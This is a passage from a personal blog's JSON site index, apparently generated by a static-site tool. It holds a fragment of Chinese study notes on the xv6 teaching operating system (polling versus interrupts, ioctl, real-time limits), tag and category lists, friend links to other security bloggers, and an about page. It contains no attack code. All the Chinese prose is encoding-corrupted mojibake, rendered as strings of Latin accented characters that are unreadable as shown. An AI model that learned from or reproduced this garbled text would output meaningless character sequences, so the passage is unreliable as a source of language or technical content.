å¦‚æœè®¾å¤‡æ‰§è¡Œæ“ä½œéå¸¸å¿«ï¼Œè½®è¯¢æ•ˆç‡è¾ƒé«˜ï¼Œä½†æ˜¯å¦‚æœè®¾å¤‡å¤§éƒ¨åˆ†æ—¶é—´å¤„äºç©ºé—²çŠ¶æ€ï¼Œåˆ™ä¼šæµªè´¹ CPU æ—¶é—´ æŸäº›é©±åŠ¨ç¨‹åºæ ¹æ®å½“å‰è®¾å¤‡è´Ÿè½½ä¼šåœ¨è½®è¯¢å’Œä¸­æ–­ä¹‹é—´åŠ¨æ€åˆ‡æ¢ è®¾å¤‡ä½¿ç”¨å¦‚ç¬¬ 1 ç« æ‰€è¿°ï¼Œæ§åˆ¶å°åœ¨åº”ç”¨ç¨‹åºå‘ˆç°ä¸ºä¸€ä¸ªå¸¸è§„æ–‡ä»¶ï¼Œåº”ç”¨ç¨‹åºé€šè¿‡ read å’Œ write ç³»ç»Ÿè°ƒç”¨è¯»å–è¾“å…¥ï¼Œå†™å…¥è¾“å‡º åº”ç”¨ç¨‹åºå¯èƒ½æƒ³è¦æ§åˆ¶ä¸èƒ½ä½œä¸ºæ ‡å‡†æ–‡ä»¶ç³»ç»Ÿè°ƒç”¨çš„è®¾å¤‡ï¼ŒUnix æ“ä½œç³»ç»Ÿæ”¯æŒ ioctl ç³»ç»Ÿè°ƒç”¨åº”å¯¹è¿™ç§æƒ…å†µ å®æ—¶å“åº”è®¡ç®—æœºçš„ä¸€äº›ä½¿ç”¨éœ€è¦ç³»ç»Ÿåœ¨æœ‰é™çš„æ—¶é—´å†…åšå‡ºå“åº”ï¼ˆä¸¥æ ¼å®‰å…¨çš„ç³»ç»Ÿé”™è¿‡ deadline å¯èƒ½ä¼šå¯¼è‡´ç¾éš¾ï¼‰ xv6 ä¸é€‚åˆä¸¥æ ¼å®æ—¶è®¾ç½®ï¼Œä¸¥æ ¼å®æ—¶æ“ä½œç³»ç»Ÿå¾€å¾€æ˜¯ä¸åº”ç”¨ç¨‹åºé“¾æ¥çš„åº“ï¼Œå…è®¸è¿›è¡Œåˆ†ææœ€åæƒ…å†µä¸‹çš„å“åº”æ—¶é—´ xv6 ä¹Ÿä¸é€‚åˆè½¯å®æ—¶åº”ç”¨ç¨‹åºï¼Œå¶å°”é”™è¿‡ deadline æ˜¯å¯ä»¥æ¥å—çš„ï¼Œå› ä¸º xv6 è°ƒç”¨ç¨‹åºè¿‡äºç®€å•ï¼Œå¹¶ä¸”å®ƒåœ¨å†…æ ¸ä»£ç è·¯å¾„ä¸­æœ‰ä¸€æ®µè¾ƒé•¿æ—¶é—´ä¸­æ–­æ˜¯ç¦æ­¢çš„","link":"/2022/10/14/Xv6/"}],"tags":[{"name":"Pwn","slug":"Pwn","link":"/tags/Pwn/"},{"name":"Operating System","slug":"Operating-System","link":"/tags/Operating-System/"},{"name":"RISC-V","slug":"RISC-V","link":"/tags/RISC-V/"},{"name":"Xv6","slug":"Xv6","link":"/tags/Xv6/"},{"name":"Rust","slug":"Rust","link":"/tags/Rust/"}],"categories":[{"name":"MonthReport","slug":"MonthReport","link":"/categories/MonthReport/"},{"name":"Exploration","slug":"Exploration","link":"/categories/Exploration/"},{"name":"Tools","slug":"Tools","link":"/categories/Tools/"},{"name":"Course","slug":"Course","link":"/categories/Course/"},{"name":"MIT 6.1810 2022Fall","slug":"Course/MIT-6-1810-2022Fall","link":"/categories/Course/MIT-6-1810-2022Fall/"},{"name":"Computer Science","slug":"Computer-Science","link":"/categories/Computer-Science/"}],"pages":[{"title":"","text":"{\"Scardow\":{\"url\":\"https://scardow.cn\",\"img\":\"https://github.com/Scardow/scardow.github.io/blob/main/images/images.png\",\"text\":\"ç«ä¹å¤§ä½¬\"},\"Asiv\":{\"url\":\"https://niceasiv.cn\",\"img\":\"https://niceasiv.cn/sysimg/head.jpg\",\"text\":\"æˆ‘æ»´é˜¿è¥¿ï¼\"},\"Wings\":{\"url\":\"https://blog.wingszeng.top\",\"img\":\"https://blog.wingszeng.top/img/avatar.gif\",\"text\":\"å·¨ä½¬è€ä¹¡ Wings gg\"},\"Arttnba3\":{\"url\":\"https://arttnba3.cn\",\"img\":\"https://arttnba3.cn/img/avatars/avatar.png\",\"text\":\"Pwner, kernelã®ç¥\"},\"Eqqie\":{\"url\":\"https://\",\"img\":\"https://eqqie.cn/usr/uploads/2021/08/1035745416.jpg\",\"text\":\"Pwner, å…¨æ ˆã®ç¥\"}}","link":"/links.json"},{"title":"","text":"{\"Scardow\":{\"url\":\"https://scardow.cn\",\"img\":\"https://scardow.github.io/blob/main/images/images.png\",\"text\":\"ç«ä¹å¤§ä½¬\"},\"Asiv\":{\"url\":\"https://niceasiv.cn\",\"img\":\"https://niceasiv.cn/sysimg/head.jpg\",\"text\":\"æˆ‘æ»´é˜¿è¥¿ï¼\"},\"Wings\":{\"url\":\"https://blog.wingszeng.top\",\"img\":\"https://blog.wingszeng.top/img/avatar.gif\",\"text\":\"å·¨ä½¬è€ä¹¡ Wings gg\"},\"Arttnba3\":{\"url\":\"https://arttnba3.cn\",\"img\":\"https://arttnba3.cn/img/avatars/avatar.png\",\"text\":\"Pwner, kernelã®ç¥\"},\"Eqqie\":{\"url\":\"https://\",\"img\":\"https://eqqie.cn/usr/uploads/2021/08/1035745416.jpg\",\"text\":\"Pwner, å…¨æ ˆã®ç¥\"}}","link":"/links.json"},{"title":"","text":"æ¬¢è¿æ¥åˆ°æˆ‘çš„åšå®¢è¿™æ˜¯æˆ‘æ­å»ºçš„ç¬¬ä¸€ä¸ªåšå®¢ï¼ŒåŠŸèƒ½è¿˜ä¸å®Œå…¨ï¼Œæˆ‘ä¼šé™†ç»­æ›´æ–°ã€å®Œå–„å®ƒï¼ˆå°½é‡ä¸å’•ï¼‰ è‡ªæˆ‘ä»‹ç»Humoooor 20 å² æ‡’äººä¸€ä¸ª ç›®å‰å°±è¯»äºè¥¿å®‰æŸé«˜æ ¡ è¿™ä¸ªåšå®¢çš„ä½œç”¨è®°å½•æˆ‘çš„æŠ€æœ¯å­¦ä¹ ã€æ—¥å¸¸ç”Ÿæ´» å¯¹æˆ‘çš„æ–‡ç« æœ‰æƒ³æ³•ï¼Œæˆ–è€…æƒ³å’Œæˆ‘äº¤æµå¯ä»¥åœ¨æ–‡ç« ä¸‹é¢è¯„è®ºï¼Œæˆ–è€…ç»™æˆ‘å‘é‚®ä»¶ï¼ˆå¯èƒ½ä¸ä¼šé‚£ä¹ˆåŠæ—¶å›å¤ï¼‰ æƒ³è¦åŠæ—¶è”ç³»çš„è¯ï¼Œæ¬¢è¿è”ç³»ä¾§è¾¹æ çš„é‚®ç®±ä¸æˆ‘æ·±å…¥â™‚äº¤æµã€‚ åŒæ—¶ä¹Ÿæ¬¢è¿äº¤æ¢å‹é“¾QAQ","link":"/about/index.html"},{"title":"Friends","text":"Scardowï¼šPwner ç«ä¹ï¼ Wingsï¼šå·¨ä½¬è€ä¹¡ï¼ŒWings gg Asivï¼šæˆ‘æ»´é˜¿è¥¿ï¼ Arttnba3ï¼šPwner å†…æ ¸ã®ç¥ Eqqieï¼šPwner å…¨æ ˆã®ç¥","link":"/friends/index.html"}]}